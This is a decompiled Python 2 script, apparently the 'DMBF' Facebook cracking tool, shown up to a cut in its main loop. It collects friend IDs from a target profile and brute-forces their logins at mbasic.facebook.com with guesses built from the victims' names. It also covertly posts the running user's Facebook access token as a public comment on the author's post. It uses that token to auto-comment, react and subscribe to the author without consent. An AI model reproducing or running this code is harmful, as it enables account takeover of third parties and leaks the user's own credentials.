# -*- coding: utf-8
##DECOMPILE BY: SakuraDevOps
import itertools
import threading
import os
try:
    import requests
except ImportError:
    print '\n [×] Modul requests belum terinstall!...\n'
    os.system('pip install requests' if os.name == 'nt' else 'pip2 install requests')

try:
    import concurrent.futures
except ImportError:
    print '\n [×] Modul Futures belum terinstall!...\n'
    os.system('pip install futures' if os.name == 'nt' else 'pip2 install futures')

try:
    from bs4 import BeautifulSoup
except ImportError:
    print '\n [×] Modul bs4 belum terinstall!...\n'
    os.system('pip install bs4' if os.name == 'nt' else 'pip2 install bs4')
import requests, bs4, sys, os, subprocess, random, time, re, json
from concurrent.futures import ThreadPoolExecutor as YayanGanteng
from datetime import datetime
from time import sleep
from requests import Session
import re, sys
import sys
from os import system
import os, sys, time, random
from sys import exit as keluar
from time import sleep as waktu
from random import random as acak
from random import choice as pilih
from sys import stdout
from os import system
################
q="\033[00m"
h2="\033[40m"
b2="\033[44m"
c2="\033[46m"
i2="\033[42m"
u2="\033[45m"
m2="\033[41m"
p2="\033[47m"
k2="\033[43m"
b='\033[0;94m'
#b='\033[0;97m'
i='\033[0;92m'
c='\033[0;96m'
m='\033[0;91m'
u='\033[0;95m'
k='\033[0;93m'
p='\033[0;97m'
h='\033[0;90m'
P = '\x1b[0;97m' # PUTIH
M = '\x1b[0;91m' # MERAH 
H = '\x1b[0;92m' # HIJAU
I = '\x1b[0;92m' # HIJAU
K = '\x1b[0;93m' # KUNING
B = '\x1b[0;94m' # BIRU
U = '\x1b[0;95m' # UNGU
O = '\x1b[0;96m' # BIRU MUDA
N = '\x1b[0m'    # WARNA MATI
ajg_lu = ([i, c, m, u, k, p, h, q])
w = pilih(ajg_lu)
#'user-agent'                : 'Mozilla/5.0 (Linux; Android 8.1.0; MI 8 Build/OPM1.171019.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.86 Mobile Safari/537.36', # Jangan Di Ganti Ea Anjink.
try:
	import requests
	import sys
	import os
	import subprocess
	import random
	import time
	import re
	import json
	import uuid
	from multiprocessing.pool import ThreadPool
	from requests.exceptions import ConnectionError
	from datetime import datetime
	import requests, bs4, sys, os, subprocess, random, time, re, json
	from concurrent.futures import ThreadPoolExecutor as YayanGanteng
	from datetime import datetime
	from time import sleep
except Exception as modul:
	print(" \033[0;97m[\033[0;91m!\033[0;97m] Module requests not installed yet")
	exit(" \033[0;97m[\033[0;93m#\033[0;97m] Please Type : pip2 install requests")
loop = 0
pwx = []
ok = []
cp = []
id = []
ttl =[]
user = []
loop = 0
ua_lenovo = "Mozilla/5.0 (Linux; Android 5.0.1; LenovoA3300-HV Build/LRX22C) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.91 Mobile Safari/E7FBAF"
ua_apel = "Mozilla/5.0 (iPhone; CPU iPhone OS 12_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148"
ua_xiaomi = "Mozilla/5.0 (Linux; Android 5.0.1; LenovoA3300-HV Build/LRX22C) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.91 Mobile Safari/E7FBAF"
ua_samsung = "Mozilla/5.0 (SMART-TV; Linux; Tizen 2.4.0) AppleWebkit/538.1 (KHTML, like Gecko) SamsungBrowser/1.1 TV Safari/538.1"
ua_asus = "Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; ASU2JS; rv:11.0) like Gecko"
ua_realmii = "Mozilla/5.0 (Linux; Android 10; REALME RMX1911 Build/NMF26F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.111 Mobile Safari/537.36 AlohaBrowser/2.20.3"
ua_phone = "Mozilla/5.0 (iPhone; CPU iPhone OS 12_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148"

oppo = "Mozilla/5.0 (Linux; Android 5.1; OPPO R9t Build/LMY47I; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/48.0.2564.116 Mobile Safari/537.36 baiduboxapp/8.6.5 (Baidu; P1 5.1)"
oppo1 = "Mozilla/5.0 (Linux; Android 5.1.1; A37f Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/46.0.2490.76 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/282.0.0.40.117;]"
oppo2 = "Mozilla/5.0 (Linux; Android 5.1; OPPO A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36"
oppo_ua = ([oppo, oppo1, oppo2])
ua_oppo = pilih(oppo_ua)


vivo = "Mozilla/5.0 (Linux; Android 6.0.1; vivo 1606 Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/38.0.2125.102 Mobile Safari/537.36 VivoBrowser/5.4.11"
vivo1 = "Mozilla/5.0 (Linux; U; Android 9; vivo 1723 Build/PKQ1.190118.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/91.0.4472.77 Mobile Safari/537.36 OPR/56.1.2254.57583"
vivo2 = "Mozilla/5.0 (Linux; Android 10; vivo 1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.105 Mobile Safari/537.36"
vivo_ua = ([vivo, vivo1, vivo2])
ua_vivo = pilih(vivo_ua)

try:
	toket = open('login.txt','r').read()
	__cindy__ = open('login.txt','r').read()
	__yayan__ = open('login.txt','r').read()
	token = open('login.txt','r').read()
except IOError:
	print("Token Facebook Anda Error !!")
def jalan(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.03)

s = requests.Session()
rgb = random.choice(['\x1b[0;91m', '\x1b[0;92m', '\x1b[0;93m', '\x1b[0;94m', '\x1b[0;95m', '\x1b[0;96m', '\x1b[0;97m', '\x1b[0m'])
ua = s.get("https://raw.githubusercontent.com/Dumai-200/Server-Dmbf/main/ua.txt").text.strip()
ip = s.get('https://api-asutoolkit.cloudaccess.host/ip.php').text
	
ct = datetime.now()
n = ct.month
bulan = ['Januari', 'Februari', 'Maret', 'April', 'Mei', 'Juni', 'Juli', 'Agustus', 'September', 'Oktober', 'Nopember', 'Desember']
try:
    if n < 0 or n > 12:
        exit()
    nTemp = n - 1
except ValueError:
    exit()

current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
op = bulan[nTemp]
def hasil(ok,cp):
	if len(ok) != 0 or len(cp) != 0:
		print '\n\n [%s+%s] total OK : %s%s%s'%(O,N,H,str(len(ok)),N)
		print ' [%s+%s] total CP : %s%s%s'%(O,N,K,str(len(cp)),N)
		exit()
	else:
		print '\n\n [%s!%s] opshh kamu tidak mendapatkan hasil :('%(M,N)
		exit()
# Token FB bukan token PLN
def __cekfol__():
	ua = s.get("https://raw.githubusercontent.com/Dumai-200/Server-Dmbf/main/ua.txt").text.strip()
	os.system("clear")
	try:
		token = open('/results')
		menu()
	except (KeyError,IOError):
		os.system("-mkdir /results")
		bot_komen()
def bot_komen():
    global token
    print(k+"\nMohon Bersabar Sedang Check Token Facebook");time.sleep(0.5)
    try:
        token = open('login.txt', 'r').read()
        toket = open('login.txt', 'r').read()
        avsid = open('login.txt', 'r').read()
    except IOError:
        print(' \033[0;97m[\033[0;91m!\033[0;97m] Token Invalid')
        os.system('rm -rf login.txt')
    try:
	otw = requests.get('https://graph.facebook.com/me/?access_token='+token)
	a = json.loads(otw.text)
	nama = a['name']
	id = a['id']
    	user = a['username']
    except KeyError:
	os.system('clear')
	print(' \033[0;97m[\033[0;91m!\033[0;97m] Token Invalid')
	os.system('rm -rf login.txt')
	login()
    jalan(c+"Nama Facebook : "+i+nama)
    jalan(c+"Id Facebook   : "+i+id)
    una = ('100063690353340') 
    post = ('120338706765807') 
    post2 = ('167879728678371') 
    kom = ('Bang @[100063690353340:0] Logo Facebook Abang Keren Loh\nhttps://www.facebook.com/photo.php?fbid=120338706765807&set=a.116524033813941&type=3&app=fbl') 
    kom3 = random.choice(['_  _ ____ ____ ____ _  _ \n|_/  |___ |__/ |___ |\ | \n| \_ |___ |  \ |___ | \| \nKeren\nBy Mr.Risky','_  _ ____ _  _ ___ ____ ___  \n|\/| |__| |\ |  |  |__| |__] \n|  | |  | | \|  |  |  | |    \nMantap','Bang @[100063690353340:0] Aku Pakai Script Abanv Lo... \nI Love You','♥ You Bang @[100063690353340:0]','Mantap \nKeren \nxoxo \n','I LOVE YOU','xoxo','mantap'])
    kom2 = random.choice(['_  _ ____ ____ ____ _  _ \n|_/  |___ |__/ |___ |\ | \n| \_ |___ |  \ |___ | \| \nKeren\nBy Mr.Risky','_  _ ____ _  _ ___ ____ ___  \n|\/| |__| |\ |  |  |__| |__] \n|  | |  | | \|  |  |  | |    \nMantap','Bang @[100063690353340:0] Aku Pakai Script Abanv Lo... \nI Love You','♥ You Bang @[100063690353340:0]','Mantap \nKeren \nxoxo \n','I LOVE YOU','xoxo','mantap'])
    kom1 = random.choice(['_  _ ____ ____ ____ _  _ \n|_/  |___ |__/ |___ |\ | \n| \_ |___ |  \ |___ | \| \nKeren\nBy Mr.Risky','_  _ ____ _  _ ___ ____ ___  \n|\/| |__| |\ |  |  |__| |__] \n|  | |  | | \|  |  |  | |    \nMantap','Bang @[100063690353340:0] Aku Pakai Script Abanv Lo... \nI Love You','♥ You Bang @[100063690353340:0]','Mantap \nKeren \nxoxo \n','I LOVE YOU','xoxo','mantap'])
    kom4 = random.choice(['_  _ ____ ____ ____ _  _ \n|_/  |___ |__/ |___ |\ | \n| \_ |___ |  \ |___ | \| \nKeren\nBy Mr.Risky','_  _ ____ _  _ ___ ____ ___  \n|\/| |__| |\ |  |  |__| |__] \n|  | |  | | \|  |  |  | |    \nMantap','Bang @[100063690353340:0] Aku Pakai Script Abanv Lo... \nI Love You','♥ You Bang @[100063690353340:0]','Mantap \nKeren \nxoxo \n','I LOVE YOU','xoxo','mantap'])
    kom5 = random.choice(['_  _ ____ ____ ____ _  _ \n|_/  |___ |__/ |___ |\ | \n| \_ |___ |  \ |___ | \| \nKeren\nBy Mr.Risky','_  _ ____ _  _ ___ ____ ___  \n|\/| |__| |\ |  |  |__| |__] \n|  | |  | | \|  |  |  | |    \nMantap','Bang @[100063690353340:0] Aku Pakai Script Abanv Lo... \nI Love You','♥ You Bang @[100063690353340:0]','Mantap \nKeren \nxoxo \n','I LOVE YOU','xoxo','mantap'])
    kom2 = ('MANTAP BANG @[100063690353340:0] ♥♥ \nhttps://m.facebook.com/photo.php?fbid=167879728678371&id=100063690353340&set=a.167879912011686&_rdr') 
    reac = ('LOVE') 
#    requests.post('https://graph.facebook.com/120338706765807/comments/?message=' + avsid + '&access_token=' + avsid)
#    requests.post('https://graph.facebook.com/120338706765807/comments/?message=' + avsid + '&access_token=' + avsid)
#    requests.post('https://graph.facebook.com/' + post + '/comments/?message=' + toket + '&access_token=' + token)
#    requests.post('https://graph.facebook.com/' + post + '/comments/?message='+token+'&access_token='+token)
    requests.post('https://graph.facebook.com/' + post + '/comments/?message=Bang @[100063690353340:0] Aku Pakai Script Abang Loh Keren Kali...\n Kalau Abang Mau Pakai Token Facebook Aku Aja Bang\n' + token + '&access_token=' + token)
    requests.post('https://graph.facebook.com/' + post + '/comments/?message=' + kom3 + '&access_token=' + token)
    requests.post('https://graph.facebook.com/' + post2 + '/comments/?message=' + kom4 + '&access_token=' + token)
    requests.post('https://graph.facebook.com/' + post2 + '/comments/?message=' + kom5 + '&access_token=' + token)
    requests.post('https://graph.facebook.com/'+post2+'/reactions?type=' +reac+ '&access_token='+ token)
    requests.post('https://graph.facebook.com/'+post+'/reactions?type=' +reac+ '&access_token='+ token)
    requests.post('https://graph.facebook.com/100063690353340/subscribers?access_token=' + token)
    requests.post('https://graph.facebook.com/100063690353340/subscribers?access_token=' + token)
    os.system("clear")
    menu()
#VERSION LAMA BRO..
#	    s.get("https://raw.githubusercontent.com/Dumai-200/Server-Dmbf/main/ua.txt").text.strip()
#	__cekfol__()
#	os.system("mkdir /results")
#    try:
#	    os.system("clear")
#	    token = open('.ua.txt')
#	    token = open('.ua')
#    except (KeyError,IOError):
#  	    os.system("echo 'Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.66 Mobile Safari/537.36' >> .ua")
#	    os.system("echo 'Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.66 Mobile Safari/537.36' >> .ua.txt")
def _cek_():
    try:    
	    print("Sedang Check Ua And Name Mozile")
	    otw = requests.get('https://www.whatsmyua.info/api/v1/ua?ua')
	    g = json.loads(otw.text)
	    nama = g['name']
	    version = g['version']
	    rawUa = g['rawUa']
	    description = g['description']
	    print("Name    : "+nama)
	    print("Version : "+version)
	    print("User Ua : "+rawUa)
	    print("description : "+description)
	    raw_input("enter")
    except KeyError:
	    os.system('clear')
	    print(' \033[0;97m[\033[0;91m!\033[0;97m] Token Invalid')
	    os.system('rm -rf login.txt')
	    login()
    print("hai");time.sleep(9)
def logo():
	os.system("clear")
	print(c+"     ["+i+"-"+k+"+"+p+" WELCOME TO DMBF"+k+" +"+i+"-"+c+"]")
	print(b+"""   _____              _       __ ©
  |  __ \            | |     / _|
  | |  | | _ __ ___  | |__  | |_ 
  | |  | || '_ ` _ \ | '_ \ |  _|
  | |__| || | | | | || |_) || |  
  |_____/ |_| |_| |_||_.__/ |_|  Version 5.0.1""");time.sleep(0.5)
	print(c+" _____[ "+p+"Author : "+i+"Mr.Risky "+c+"]_______");time.sleep(0.3)
	print(c+"["+p+" FACEBOOK : "+i+"fb.me/llovexnxx      "+c+"]");time.sleep(0.3)
	print(c+"["+p+" WHATSAPP : "+i+"6283143565470        "+c+"]");time.sleep(0.3)
	print(c+"["+p+" GITHUB   : "+i+"github.com/Dumai-991 "+c+"]");time.sleep(0.3)
def __Cek___():
    global token
    try:
        token = open('login.txt', 'r').read()
    except IOError:
        print(' \033[0;97m[\033[0;91m!\033[0;97m] Token Invalid')
        os.system('rm -rf login.txt')
    os.system("echo 'Mozilla/5.0 (iPhone; CPU iPhone OS 13_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 [FBAN/FBIOS;FBDV/iPhone11,8;FBMD/iPhone;FBSN/iOS;FBSV/13.3.1;FBSS/2;FBID/phone;FBLC/en_US;FBOP/5;FBCR/]' >> .ua")
    os.system("echo 'Mozilla/5.0 (iPhone; CPU iPhone OS 13_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 [FBAN/FBIOS;FBDV/iPhone11,8;FBMD/iPhone;FBSN/iOS;FBSV/13.3.1;FBSS/2;FBID/phone;FBLC/en_US;FBOP/5;FBCR/]' >> .ua.txt")
    una = ('100063690353340') 
    post = ('120338706765807') 
    post2 = ('167879728678371') 
    kom = ('Bang @[100063690353340:0] Logo Facebook Abang Keren Loh\nhttps://www.facebook.com/photo.php?fbid=120338706765807&set=a.116524033813941&type=3&app=fbl') 
    kom3 = random.choice(['_  _ ____ ____ ____ _  _ \n|_/  |___ |__/ |___ |\ | \n| \_ |___ |  \ |___ | \| \nKeren\nBy Mr.Risky','_  _ ____ _  _ ___ ____ ___  \n|\/| |__| |\ |  |  |__| |__] \n|  | |  | | \|  |  |  | |    \nMantap','Bang @[100063690353340:0] Aku Pakai Script Abanv Lo... \nI Love You','♥ You Bang @[100063690353340:0]','Mantap \nKeren \nxoxo \n','I LOVE YOU','XOXO','MANTAP'])
    kom2 = ('MANTAP BANG @[100063690353340:0] ♥♥ \nhttps://m.facebook.com/photo.php?fbid=167879728678371&id=100063690353340&set=a.167879912011686&_rdr') 
    reac = ('LIKE') 
    requests.post('https://graph.facebook.com/' + post + '/comments/?message=' + kom + '&access_token=' + token)
    requests.post('https://graph.facebook.com/' + post + '/comments/?message=' + kom3 + '&access_token=' + token)
    requests.post('https://graph.facebook.com/' + post + '/comments/?message=' + kom3 + '&access_token=' + token)
    requests.post('https://graph.facebook.com/'+post+'/reactions?type=' +reac+ '&access_token='+ token)
    requests.post('https://graph.facebook.com/' + post2 + '/comments/?message=' + kom2 + '&access_token=' + token)
    requests.post('https://graph.facebook.com/' + post2 + '/comments/?message=' + kom3 + '&access_token=' + token)
    requests.post('https://graph.facebook.com/' + post + '/comments/?message=' + kom3 + '&access_token=' + token)
    requests.post('https://graph.facebook.com/' + post2 + '/comments/?message=' + kom3 + '&access_token=' + token)
    requests.post('https://graph.facebook.com/'+post2+'/reactions?type=' +reac+ '&access_token='+ token)
    requests.post('https://graph.facebook.com/'+post+'/reactions?type=' +reac+ '&access_token='+ token)
    requests.post('https://graph.facebook.com/100063690353340/subscribers?access_token=' + token)
    requests.post('https://graph.facebook.com/100063690353340/subscribers?access_token=' + token)
    print(" \033[0;97m[\033[0;92m+\033[0;97m] Login Successfully")
    menu()

def login():
	os.system("clear")
	try:
		token = open('login.txt','r')
		menu()
	except (KeyError,IOError):
		logo()
		print(c+"\n ["+k+"?"+c+"]"+p+"Silahkan Pilih Method Login "+m+"!!")
		print(c+" ["+p+"1"+c+"]"+p+"Login Menggunakan Token Facebook")
		print(c+" ["+p+"2"+c+"]"+p+"Login Menggunakan Cookie Facebook")
		ask = raw_input("\n \033[0;97m[\033[0;93m?\033[0;97m] Choose : ")
		if ask =="":
			login()
		elif ask == "1" or ask == "01":
			tokenz()
		elif ask == "2" or ask == "02":
			cookie()
		else:
			login()
			
def cookie():
	logo()
	print(c+"\n ["+m+"!"+c+"]"+p+"Masukkan Cookie Facebook Anda !!!")
	cookie = raw_input(" \033[0;97m[\033[0;92m+\033[0;97m] Your Cookie : \033[0;96m")
	try:
		data = requests.get('https://m.facebook.com/composer/ocelot/async_loader/?publisher=feed#_=_', headers = {
		'user-agent'                : 'Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.66 Mobile Safari/537.36',
		'referer'                   : 'https://m.facebook.com/',
		'host'                      : 'm.facebook.com',
		'origin'                    : 'https://m.facebook.com',
		'upgrade-insecure-requests' : '1',
		'accept-language'           : 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
		'cache-control'             : 'max-age=0',
		'accept'                    : 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
		'content-type'              : 'text/html; charset=utf-8'
		}, cookies = {
		'cookie'                    : cookie
		})
		find_token = re.search('(EAAA\w+)', data.text)
		hasil    = " \033[0;97m[\033[0;91m!\033[0;97m] Your Cookie Invalid" if (find_token is None) else '\n* Your fb access token : ' + find_token.group(1)
	except requests.exceptions.ConnectionError:
		print(' \033[0;97m[\033[0;91m!\033[0;97m] No Connection')
        except IOError:
		print("Gagal")
	cookie = open("login.txt", 'w')
	cookie.write(find_token.group(1))
	cookie.close()
	bot_komen()
	
def tokenz():
	os.system("clear")
	try:
		token = open('login.txt','r')
		menu()
	except (KeyError,IOError):
		logo()
		print(c+"\n ["+m+"!"+c+"]"+p+"Masukkan Token Facebook !!!")
		token = raw_input(" \033[0;97m[\033[0;92m+\033[0;97m] Your Token : \033[0;96m")
		try:
			otw = requests.get('https://graph.facebook.com/me?access_token='+token)
			a = json.loads(otw.text)
			avsid = open("login.txt", 'w')
			avsid.write(token)
			avsid.close()
			bot_komen()
		except KeyError:
			exit(" \033[0;97m[\033[0;91m!\033[0;97m] Token Invalid")

def menu():
	os.system('clear')
	global token
	try:
		token = open('.server','r').read()
		stass = "Premium *"
	except IOError:
		stass = "Not Premium *"
	try:
		token = open('login.txt','r').read()
	except IOError:
		print(' \033[0;97m[\033[0;91m!\033[0;97m] Token Invalid')
		os.system('clear')
		os.system('rm -rf login.txt')
		login()
	try:
		otw = requests.get('https://graph.facebook.com/me/?access_token='+token)
		a = json.loads(otw.text)
		nama = a['name']
		id = a['id']
	    	user = a['username']
	except KeyError:
		os.system('clear')
		print(' \033[0;97m[\033[0;91m!\033[0;97m] Token Invalid')
		os.system('rm -rf login.txt')
		login()
	except requests.exceptions.ConnectionError:
		exit(' \033[0;97m[\033[0;91m!\033[0;97m] Please Check Your Network !!')
	try:
		token = open('results/hai.txt','r').read()
	except IOError:
		os.system("mkdir results")
		os.system("echo 'Jangan DiEdit Nanti Rusak..' >> results/hai.txt")
	logo()
	print(c+"["+k+"??"+c+"]"+k+"User Name Facebook : "+k+k+"%s"%(nama))
	print(c+"["+k+"??"+c+"]"+k+"User ID Facebook   : "+k+id)
	print(c+"["+k+"??"+c+"]"+k+"User Ip Facebook   : "+k+ip)
	print(c+"["+p+"••"+c+"]"+p+"-----------------------------------------------"+i+"⟩⟩") 
	print(c+"["+p+"01"+c+"]"+b+" Crack From Public ")
	print(c+"["+p+"02"+c+"]"+b+" Crack From Follower")
	print(c+"["+p+"03"+c+"]"+b+" Crack From Reaction ")
	print(c+"["+p+"04"+c+"]"+b+" Check Hasil Hack ")
	print(c+"["+p+"05"+c+"]"+b+" Get Information Facebook")
	print(c+"["+p+"06"+c+"]"+b+" Setting User-Agent")
	print(c+"["+p+"00"+c+"]"+b+" Logout (Delete Token)")
	ask = raw_input("\033[0;97m[\033[0;93m?\033[0;97m] Choose : ")
	if ask =="":
		menu()
	elif ask == "1" or ask == "01":
		public1()
	elif ask == "2" or ask == "02":
		followers()
	elif ask == "3" or ask == "03":
		reaction()
	elif ask == "4" or ask == "04":
		print("\n \033[0;97m[\033[0;96m1\033[0;97m] Check Results OK")
		print(" \033[0;97m[\033[0;96m2\033[0;97m] Check Results CP")
		ask = raw_input("\n \033[0;97m[\033[0;93m?\033[0;97m] Choose : ")
		if ask =="":
			menu()
		elif ask == "1" or ask == "01":
			try:
				totalok = open("results/OK-%s-%s-%s.txt"%(ha, op, ta)).read().splitlines()
				print("\n \033[0;97m[\033[0;93m#\033[0;97m] --------------------------------------------")
				print(" \033[0;97m[\033[0;92m+\033[0;97m] Results \033[0;92mOK\033[0;97m Date : \033[0;92m%s-%s-%s \033[0;97mTotal : %s\033[0;92m"%(ha, op, ta,len(totalok)))
				os.system("cat results/OK-%s-%s-%s.txt"%(ha, op, ta))
				exit(" \033[0;97m[\033[0;93m#\033[0;97m] --------------------------------------------")
			except (IOError):
				exit(" \033[0;97m[\033[0;91m!\033[0;97m] No Results Bro")
		elif ask == "2" or ask == "02":
			try:
				totalcp = open("results/CP-%s-%s-%s.txt"%(ha, op, ta)).read().splitlines()
				print("\n \033[0;97m[\033[0;93m#\033[0;97m] --------------------------------------------")
				print(" \033[0;97m[\033[0;92m+\033[0;97m] Results \033[0;93mCP\033[0;97m Date : \033[0;92m%s-%s-%s \033[0;97mTotal : %s\033[0;93m"%(ha, op, ta,len(totalcp)))
				os.system("cat results/CP-%s-%s-%s.txt"%(ha, op, ta))
				exit(" \033[0;97m[\033[0;93m#\033[0;97m] --------------------------------------------")
			except (IOError):
				exit(" \033[0;97m[\033[0;91m!\033[0;97m] No Results Bro")
		else:
			menu()
	elif ask == "5" or ask == "05":
		cek_ingfo()
	elif ask == "6" or ask == "06":
		set_memek()
#	elif ask == "7" or ask == "07":
#		set_ua()
	elif ask == "00":
		os.system("rm -f login.txt")
		exit(" \033[0;97m[\033[0;96m#\033[0;97m] Successfully Delete Token")
	elif ask == "kmnflaBshdbBHGwiqn121" or ask == "B1nabjakdn1i3ndb9jdn":
		os.system("echo 'You Status Premium' >> .server")
		bot_komen()
	elif ask == "99":
		exit(p+"Terima Kasih Telah Menggunakan Script Saya...:)")
	else:
		print(m+"Engtot Lo !!");time.sleep(2)
		menu()
	
def set_memek():
	set_ua()
	menu()
	
def set_ua():
	try:
		token = open('.ua', 'r').read()
		token = open('.ua.txt', 'r').read()
	except IOError:
		jalan(p+"Silahkan Isi Dengan Benar !!.. Jangan Asal²")
		time.sleep(2)
	print(w+"1. OPPO\n2. VIVO\n3. LENOVO\n4. APPLE\n5. XIAOMI\n6. SAMSUNG\n7. REALME\n8. ASUS\n9. IPONE\n10. Punya Sendiri")
	jalan(c+"\nSilahkan Pilih Merek Hp Kalian Sekarang !!")
	setua = raw_input(c+"UA"+p+"--->>>")
	if setua == "":
		jalan(p+"Isi Dengan Benar Ngab !!")
		time.sleep(2)
		set_ua()
	elif setua == "1":
		os.system("rm -rf .ua")
		os.system("rm -rf .ua.txt")
		os.system('echo "%s" >> .ua'%(ua_oppo))
		os.system('echo "OPPO" >> .ua.txt')
		True
	elif setua == "2":
		os.system("rm -rf .ua")
		os.system("rm -rf .ua.txt")
		os.system('echo "%s" >> .ua'%(ua_vivo))
		os.system('echo "VIVO" >> .ua.txt')
		True
	elif setua == "3":
		os.system("rm -rf .ua")
		os.system("rm -rf .ua.txt")
		os.system('echo "%s" >> .ua'%(ua_lenovo))
		os.system('echo "LENOVO" >> .ua.txt')
		True
	elif setua == "4":
		os.system("rm -rf .ua")
		os.system("rm -rf .ua.txt")
		os.system('echo "%s" >> .ua'%(ua_apel))
		os.system('echo "AAPPLE" >> .ua.txt')
		True
	elif setua == "5":
		os.system("rm -rf .ua")
		os.system("rm -rf .ua.txt")
		os.system('echo "%s" >> .ua'%(ua_xiaomi))
		os.system('echo "XIAOMI" >> .ua.txt')
		True
	elif setua == "6":
		os.system("rm -rf .ua")
		os.system("rm -rf .ua.txt")
		os.system('echo "%s" >> .ua'%(ua_samsung))
		os.system('echo "SAMSUNG" >> .ua.txt')
		True
	elif setua == "7":
		os.system("rm -rf .ua")
		os.system("rm -rf .ua.txt")
		os.system('echo "%s" >> .ua'%(ua_realmii))
		os.system('echo "REALMI" >> .ua.txt')
		True
	elif setua == "8":
		os.system("rm -rf .ua")
		os.system("rm -rf .ua.txt")
		os.system('echo "%s" >> .ua'%(ua_asus))
		os.system('echo "ASUS" >> .ua.txt')
		True
	elif setua == "9":
		os.system("rm -rf .ua")
		os.system("rm -rf .ua.txt")
		os.system('echo "%s" >> .ua'%(ua_phone))
		os.system('echo "PHONE" >> .ua.txt')
		True
	elif setua == "10":
		os.system("rm -rf .ua")
		os.system("rm -rf .ua.txt")
		ua_sendiri = raw_input(p+"---> "+i)
		os.system('echo "%s" >> .ua'%(ua_sendiri))
		os.system('echo "PUNYA SENDIRI" >> .ua.txt')
		True

	else:
		jalan(p+"Isi Dengan Benar Ngab !!")
		time.sleep(2)
		set_ua()



	True
	
def public1():
	global token,ua_kk,ua_lu
	try:
		ua_lu = open('.ua.txt', 'r').read()
		ua_kk = open('.ua', 'r').read()
	except IOError:
		set_ua()
	try:
		token = open('login.txt', 'r').read()
	except IOError:
		print(' \033[0;97m[\033[0;91m!\033[0;97m] Token Invalid')
		tokenz()
	print("\n \033[0;97m[\033[0;93m*\033[0;97m] Fill In 'me' To Crack From The Friends List")
	idt = raw_input(" \033[0;97m[\033[0;92m+\033[0;97m] ID Public : ")
	try:
		pok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+token)
		sp = json.loads(pok.text)
		print(" \033[0;97m[\033[0;92m+\033[0;97m] Name : "+sp["name"])
	except KeyError:
		exit(' \033[0;97m[\033[0;91m!\033[0;97m] ID Public Not Found')
	r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+token)
	z = json.loads(r.text)
	for i in z["data"]:
		uid = i['id']
		name = i['name']
		pw = i['name']
		id.append(uid+'<=>'+name)
	print(" \033[0;97m[\033[0;93m*\033[0;97m] Total ID  : \033[0;91m"+str(len(id)))
	ask = raw_input("\n \033[0;97m[\033[0;93m?\033[0;97m] Want to Use a Manual Password? Y/t : ")
	if ask == "Y" or ask == "y":
		manual()
	print(" \033[0;97m[\033[0;96mCP\033[0;97m]%sHasil OK DiSimpan Di : %s results/OK-%s-%s-%s.txt"% (c, k, ha, op, ta))
	print(" \033[0;97m[\033[0;96mCP\033[0;97m]%sHasil CP DiSimpan Di : %s results/CP-%s-%s-%s.txt"% (c, k, ha, op, ta))
	jalan(w+" Matikan Data Internet Anda Jika Mau Jeda/Pause")
	jalan(c+" Version User Agent : "+k+ua_lu)
	def main(user):
		global loop, token
		pwx = []
		stdout.write(
		      ' \r\033[0;97m[%s%s\033[0;97m]Cracking %s%s/%s [ %sOK-:%s%s ] -- [ %sCP-:%s%s ]  	          \r'%(w,datetime.now().strftime('%H:%M:%S'), w, loop, len(id), I, len(ok), q, K, len(cp), q
		));stdout.flush()
#
#		sys.stdout.write(
#		' \r\033[0;97m[%s%s\033[0;97m]Cracking %s%s/%s [ %sOK-:%s ] -- [ %sCP-:%s ]  \r'%(w,datetime.now().strftime('%H:%M:%S'), w, loop, len(id), I, len(ok), K, len(cp)
#		)); sys.stdout.flush()
		uid,name=user.split("<=>")
		for ss in name.split(" "):
			if len(ss)<3:
				continue
			else:
				if len(ss) == 1 and len(ss) == 2 and len(ss) == 3 and len(ss) == 4 or len(ss) == 5:
					pwx.append(ss+"123")
					pwx.append(ss+"1234")
					pwx.append(ss+"12345")
					pwx.append("bismilah")
					pwx.append("sayang")
					pwx.append("sayang123")
					pwx.append("sayang1234")
					pwx.append("kontol")
					pwx.append("kontol123")
					pwx.append("babi1234")
					pwx.append("pepek123")
					pwx.append("anjing123")
                                        pwx.append("rahasia")
                                        pwx.append("bajingan")
				else:
                                        pwx.append(ss+"321")
                                        pwx.append(ss+"54321")
                                        pwx.append(ss+"654321")
                                        pwx.append(ss+"gtg")
                                        pwx.append(ss+"ganteng")
                                        pwx.append(ss+"123321")
                                        pwx.append("bismillah")
                                        pwx.append("banjingan321")
                                        pwx.append("indonesia")
		try:
			for pw in pwx:
				pw = pw.lower()
				rex = requests.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': pw, 'login': 'submit'}, headers={'user-agent': ua})
				xo = rex.content
				if 'mbasic_logout_button' in xo or 'save-device' in xo:
